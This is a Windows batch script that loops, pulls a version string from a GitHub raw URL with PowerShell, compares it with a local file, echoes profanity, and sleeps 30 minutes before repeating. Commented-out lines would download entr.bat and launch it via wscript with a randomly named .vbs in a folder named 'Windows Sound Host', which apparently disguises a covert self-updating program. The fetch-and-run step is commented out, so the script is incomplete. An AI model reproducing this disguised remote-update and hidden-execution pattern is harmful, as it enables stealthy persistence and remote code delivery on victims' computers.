::@echo off 
set URL="https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Update.txt"
setlocal EnableDelayedExpansion

    
:Start
::loop / sleep until the file is found 
if not exist %userprofile%\documents\update\update.txt ( 
    GOTO :Start 
)

::Man i hate powershell
for /f "usebackq delims=" %%a in (`PowerShell -Command "(new-object net.webclient).DownloadString('%URL%')"`) do set V=%%a
set cvp=%userprofile%\documents\update\Update.txt
for /f "usebackq delims=" %%b in (`PowerShell -Command "Get-Content -Path "%cvp%""`) do set cvr=%%b


:: cheack if version matches if yes continue if not get entr.bat and update 
if '%cvr%'=='%V%' (
    echo FUCK YOU 
) ELSE (
    Echo FUCK YOU HARDER 
)

::powershell invoke-WebRequest 'entr.bat Download url' -outfile ./entr.bat
::start wscript.exe "%userprofile%\documents\Windows Sound Host\15a65da65s1d8w86s51d8aw.vbs" "%userprofile%\documents\Windows Sound Host\entr.bat update"
::echo not broken
::cd %userprofile%\documents\"Windows Sound Host"

timeout 1800

GOTO Start 



